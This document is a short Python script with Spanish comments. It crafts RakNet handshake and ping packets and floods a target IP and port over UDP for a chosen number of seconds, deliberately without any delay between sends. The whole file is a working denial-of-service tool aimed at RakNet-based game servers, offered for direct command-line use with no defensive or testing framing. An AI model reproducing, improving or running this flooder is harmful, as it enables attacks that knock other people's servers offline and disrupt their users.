import socket
import struct
import time
import sys

# Constantes de RakNet
RAKNET_MAGIC = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
CLIENT_GUID = 0x123456789ABCDEF0

def build_unconnected_ping():
    timestamp = int(time.time() * 1000)
    return struct.pack('>BQ', 0x01, timestamp) + RAKNET_MAGIC + struct.pack('>Q', CLIENT_GUID)

def build_open_connection_request_1():
    protocol_version = 10
    mtu_size = 1492
    return struct.pack('>BB', 0x05, protocol_version) + RAKNET_MAGIC + struct.pack('>H', mtu_size)

def build_open_connection_request_2(ip, port):
    mtu_size = 1492
    ip_bytes = b''.join([bytes([int(x)]) for x in ip.split('.')])
    server_addr = b'\x04' + ip_bytes + struct.pack('>H', port)
    return struct.pack('>B', 0x07) + RAKNET_MAGIC + server_addr + struct.pack('>H', mtu_size) + struct.pack('>Q', CLIENT_GUID)

def build_connection_request():
    timestamp = int(time.time() * 1000)
    return struct.pack('>BQ', 0x09, timestamp) + struct.pack('>Q', CLIENT_GUID)

def build_connected_ping():
    timestamp = int(time.time() * 1000)
    return struct.pack('>BQ', 0x00, timestamp)

# Puedes agregar más builders si quieres más paquetes RakNet

def raknet_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packets = [
        build_unconnected_ping(),
        build_open_connection_request_1(),
        build_open_connection_request_2(ip, port),
        build_connection_request(),
        build_connected_ping()
    ]
    sent = 0
    try:
        while time.time() < end_time:
            for packet in packets:
                try:
                    sock.sendto(packet, (ip, port))
                    sent += 1
                except Exception:
                    pass
            # Sin sleep para máxima velocidad (ajusta si tu CPU se sobrecarga)
    finally:
        sock.close()
        print(f"Paquetes enviados: {sent}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Uso: python {sys.argv[0]} <ip> <puerto> <tiempo_segundos>")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    raknet_flood(ip, port, duration)
